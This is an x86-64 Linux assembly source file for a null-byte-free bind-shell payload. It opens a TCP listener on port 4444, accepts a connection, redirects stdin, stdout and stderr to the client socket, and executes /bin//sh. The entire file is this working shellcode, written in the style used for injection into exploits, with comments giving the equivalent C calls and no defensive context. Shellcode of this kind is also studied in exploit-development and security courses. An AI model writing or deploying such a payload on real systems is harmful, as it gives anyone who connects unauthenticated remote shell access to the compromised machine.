global _start


_start:

        ; sock = socket(AF_INET, SOCK_STREAM, 0)
        ; AF_INET = 2
        ; SOCK_STREAM = 1
        ; syscall number 41

        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi

        mov al, 41

        inc rdi
        inc rdi

        inc rsi

        xor rdx, rdx

        syscall

        ; copy socket descriptor to rdi for future use

        mov rdi, rax


        ; server.sin_family = AF_INET
        ; server.sin_port = htons(PORT)
        ; server.sin_addr.s_addr = INADDR_ANY
        ; bzero(&server.sin_zero, 8)

        xor rax, rax

        push rax

        xor rbp, rbp

        push word 2
        pop bp

        mov dword [rsp-4], eax
        mov word [rsp-6], 0x5c11
        mov word [rsp-8], bp
        sub rsp, 8


        ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
        ; syscall number 49

        mov al, 49

        mov rsi, rsp
        mov dl, 16
        syscall
               ; listen(sock, MAX_CLIENTS)
        ; syscall number 50

        push word 2
        pop bp

        mov al, 50
        mov rsi, rbp
        syscall


        ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
        ; syscall number 43


        mov al, 43
        sub rsp, 16
        mov rsi, rsp
        mov byte [rsp-1], 16
        sub rsp, 1
        mov rdx, rsp

        syscall

        ; store the client socket description
        mov r9, rax

        ; close parent

        mov al, 3
        syscall

        ; duplicate sockets

        ; dup2 (new, old)
        mov rdi, r9
        mov al, 33

        xor rsi, rsi

        syscall

        mov al, 33

        push word 1
        pop bp

        mov rsi, rbp
        syscall

        mov al, 33

        push word 2
        pop bp

        mov rsi, rbp

        syscall

        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall

